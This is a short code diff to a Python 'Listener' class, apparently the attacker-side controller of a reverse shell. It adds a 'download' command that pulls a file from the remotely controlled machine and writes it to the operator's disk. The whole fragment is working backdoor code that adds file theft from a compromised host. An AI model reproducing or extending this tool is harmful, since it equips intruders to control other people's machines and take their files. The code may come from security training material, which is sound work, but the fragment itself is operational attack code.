@@ -34,11 +34,18 @@ class Listener:
             exit()
         return self.reliable_receive()
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Download Successful..."
+
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
             result = self.execute_remotely(command)
+            if command[0] == "download":
+                result = self.write_file(path=command[1], content=result)
             print(result)
 
 
